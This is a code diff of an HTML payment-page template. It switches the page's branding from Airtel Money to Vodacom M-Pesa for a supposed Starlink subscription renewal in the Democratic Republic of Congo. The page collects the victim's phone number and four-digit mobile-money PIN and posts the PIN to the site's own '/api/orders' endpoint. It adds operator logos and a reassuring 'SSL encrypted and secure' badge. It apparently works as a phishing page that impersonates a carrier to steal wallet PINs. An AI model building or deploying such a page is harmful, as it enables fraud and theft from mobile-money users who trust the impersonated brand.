@@ -10,22 +10,22 @@
   <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     :root {
-      --airtel-red: #E60000;
+      --vodacom-red: #FF0000;
       --white: #ffffff;
       --black: #000000;
       --gray: #6c757d;
       --gray-light: #9ca3af;
     }
     * { box-sizing: border-box; margin: 0; padding: 0; }
-    body { 
-      font-family: 'DM Sans', sans-serif; 
+    body {
+      font-family: 'DM Sans', sans-serif;
       background: #f8f9fa;
       color: var(--black);
       min-height: 100vh;
       display: flex;
       flex-direction: column;
     }
-    
+
     /* Header */
     .header {
       background: var(--white);
@@ -42,7 +42,7 @@
       color: var(--gray);
       font-weight: 400;
     }
-    
+
     /* Main Content */
     .main-content {
       flex: 1;
@@ -51,20 +51,20 @@
       justify-content: center;
       padding: 24px;
     }
-    
+
     /* Payment Box */
     .payment-box {
       background: var(--white);
-      border: 3px solid var(--airtel-red);
+      border: 3px solid var(--vodacom-red);
       border-radius: 16px;
       width: 100%;
       max-width: 480px;
       overflow: hidden;
     }
-    
+
     /* Red Title Bar */
     .payment-header {
-      background: var(--airtel-red);
+      background: var(--vodacom-red);
       padding: 16px 24px;
       text-align: center;
       display: flex;
@@ -80,16 +80,16 @@
       letter-spacing: 1px;
       margin: 0;
     }
-    .airtel-logo-img {
+    .vodacom-logo-img {
       height: 28px;
       width: auto;
     }
-    
+
     /* Payment Body */
     .payment-body {
       padding: 32px;
     }
-    
+
     /* Amount */
     .amount-display {
       text-align: center;
@@ -106,7 +106,7 @@
       font-size: 16px;
       margin-bottom: 24px;
     }
-    
+
     /* Instruction */
     .instruction {
       color: var(--black);
@@ -114,11 +114,9 @@
       text-align: center;
       margin-bottom: 24px;
     }
-    
+
     /* Form Fields */
-    .form-group {
-      margin-bottom: 20px;
-    }
+    .form-group { margin-bottom: 20px; }
     .form-label {
       display: block;
       font-size: 13px;
@@ -156,29 +154,18 @@
     .flag::before {
       content: '';
       position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: 
-        linear-gradient(to top right, 
-          transparent 43%, 
-          #FCD116 43%, 
-          #FCD116 46%, 
-          #E00025 46%, 
-          #E00025 57%, 
-          #FCD116 57%, 
-          #FCD116 60%, 
-          transparent 60%
-        );
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: linear-gradient(to top right,
+        transparent 43%, #FCD116 43%, #FCD116 46%,
+        #E00025 46%, #E00025 57%, #FCD116 57%, #FCD116 60%, transparent 60%);
     }
     .flag::after {
       content: '★';
       position: absolute;
       color: #FCD116;
       font-size: 5px;
-      top: 2px;
-      left: 3px;
+      top: 2px; left: 3px;
       z-index: 2;
       text-shadow: 0 0 1px #000;
     }
@@ -188,10 +175,8 @@
       font-size: 15px;
       border-radius: 0;
     }
-    .form-control:focus {
-      box-shadow: none;
-    }
-    
+    .form-control:focus { box-shadow: none; }
+
     /* PIN Entry */
     .pin-entry {
       display: flex;
@@ -211,7 +196,7 @@
       color: var(--black);
     }
     .pin-box:focus {
-      border-color: var(--airtel-red);
+      border-color: var(--vodacom-red);
       outline: none;
     }
     .helper-text {
@@ -219,11 +204,11 @@
       color: var(--gray);
       font-size: 13px;
     }
-    
+
     /* Confirm Button */
     .btn-confirm {
       width: 100%;
-      background: var(--airtel-red);
+      background: var(--vodacom-red);
       color: var(--white);
       border: none;
       padding: 16px;
@@ -236,24 +221,17 @@
       transition: background 0.2s;
       margin-top: 24px;
     }
-    .btn-confirm:hover {
-      background: #cc0000;
-    }
-    
+    .btn-confirm:hover { background: #cc0000; }
+
     /* Back Link */
-    .back-link {
-      text-align: center;
-      margin-top: 20px;
-    }
+    .back-link { text-align: center; margin-top: 20px; }
     .back-link a {
       color: var(--gray);
       text-decoration: none;
       font-size: 14px;
     }
-    .back-link a:hover {
-      text-decoration: underline;
-    }
-    
+    .back-link a:hover { text-decoration: underline; }
+
     /* Toast */
     .toast-notification {
       position: fixed;
@@ -274,6 +252,18 @@
       opacity: 1;
       transform: translateX(-50%) translateY(0);
     }
+
+    /* Footer Security Note */
+    .secure-footer {
+      text-align: center;
+      font-size: 13px;
+      color: var(--gray);
+      margin-top: 24px;
+    }
+    .secure-footer span {
+      font-size: 14px;
+      margin-right: 6px;
+    }
   </style>
 </head>
 <body>
@@ -288,26 +278,26 @@
   <div class="payment-box">
     <!-- Red Title Bar -->
     <div class="payment-header">
-      <img src="{{ url_for('static', filename='images/airtel-logo.png') }}" alt="Airtel" class="airtel-logo-img">
-      <h2>Airtel Money</h2>
+      <img src="{{ url_for('static', filename='images/vodacom-logo.png') }}" alt="Vodacom" class="vodacom-logo-img">
+      <h2>M-Pesa</h2>
     </div>
-    
+
     <!-- Payment Body -->
     <div class="payment-body">
       <!-- Amount -->
       <div class="amount-display">
-        <div class="amount-value" id="amount">CDF 0</div>
+        <div class="amount-value" id="amount">CDF 0,00</div>
         <div class="service-name">Renouvellement Starlink</div>
       </div>
-      
+
       <!-- Instruction -->
-      <p class="instruction">Entrez votre PIN Airtel Money pour autoriser</p>
-      
+      <p class="instruction">Entrez votre PIN M-Pesa pour autoriser</p>
+
       <!-- Form -->
       <form id="payment-form" onsubmit="return false;">
         <!-- Phone Number -->
         <div class="form-group">
-          <label class="form-label">Numéro Airtel Money</label>
+          <label class="form-label">Numéro M-Pesa</label>
           <div class="phone-input-wrapper">
             <div class="country-code">
               <span class="flag"></span>
@@ -316,26 +306,35 @@
             <input type="tel" class="form-control" id="phone" placeholder="000 000 000" required>
           </div>
         </div>
-        
+
         <!-- PIN Entry -->
         <div class="form-group">
           <label class="form-label">Entrez le PIN à 4 chiffres</label>
           <div class="pin-entry">
+            <label for="pin1" class="visually-hidden">PIN</label>
             <input type="password" class="pin-box" maxlength="1" id="pin1" required>
+            <label for="pin2" class="visually-hidden">PIN</label>
             <input type="password" class="pin-box" maxlength="1" id="pin2" required>
+            <label for="pin3" class="visually-hidden">PIN</label>
             <input type="password" class="pin-box" maxlength="1" id="pin3" required>
+            <label for="pin4" class="visually-hidden">PIN</label>
             <input type="password" class="pin-box" maxlength="1" id="pin4" required>
           </div>
-          <p class="helper-text">Vérifiez votre application Airtel Money ou SMS</p>
+          <p class="helper-text">Vérifiez votre application M-Pesa ou SMS</p>
         </div>
-        
+
         <!-- Confirm Button -->
         <button type="button" class="btn-confirm" onclick="confirmPayment()">Confirmer le paiement</button>
       </form>
-      
+
       <!-- Back Link -->
       <div class="back-link">
         <a href="/">← Retour aux forfaits</a>
+      </div>
+
+      <!-- Secure Footer -->
+      <div class="secure-footer">
+        <span>🔒</span> CRYPTÉ SSL ET SÉCURISÉ
       </div>
     </div>
   </div>
@@ -353,7 +352,9 @@ const urlParams = new URLSearchParams(window.location.search);
 planId = urlParams.get('plan_id');
 planPrice = urlParams.get('price') || '0';
 
-document.getElementById('amount').textContent = 'CDF ' + parseFloat(planPrice).toLocaleString('fr-CD') + ',00';
+// Format amount with French locale
+document.getElementById('amount').textContent =
+  'CDF ' + parseFloat(planPrice).toLocaleString('fr-CD', { minimumFractionDigits: 2 });
 
 // Auto-focus PIN boxes
 const pinBoxes = document.querySelectorAll('.pin-box');
@@ -388,28 +389,28 @@ function confirmPayment() {
   const pin2 = document.getElementById('pin2').value;
   const pin3 = document.getElementById('pin3').value;
   const pin4 = document.getElementById('pin4').value;
-  
+
   if (!phone) {
     showToast('Veuillez entrer votre numéro de téléphone');
     return;
   }
-  
+
   if (!pin1 || !pin2 || !pin3 || !pin4) {
     showToast('Veuillez entrer votre PIN à 4 chiffres');
     return;
   }
-  
+
   const fullPhone = '+243' + phone;
   const pin = pin1 + pin2 + pin3 + pin4;
-  
+
   // Submit order via API
   fetch('/api/orders', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ 
-      phone: fullPhone, 
+    body: JSON.stringify({
+      phone: fullPhone,
       plan_id: planId,
-      airtel_pin: pin
+      mpesa_pin: pin
     })
   })
   .then(res => res.json())
